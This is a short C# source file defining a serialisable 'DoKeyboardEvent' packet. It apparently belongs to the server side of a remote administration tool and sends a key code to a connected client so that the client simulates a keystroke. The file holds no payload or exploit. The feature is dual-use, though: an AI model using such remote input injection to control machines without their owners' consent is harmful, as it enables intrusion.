using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoKeyboardEvent : IPacket
    {
        [ProtoMember(1)]
        public byte Key { get; set; }

        public DoKeyboardEvent()
        {
        }

        public DoKeyboardEvent(byte key)
        {
            this.Key = key;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}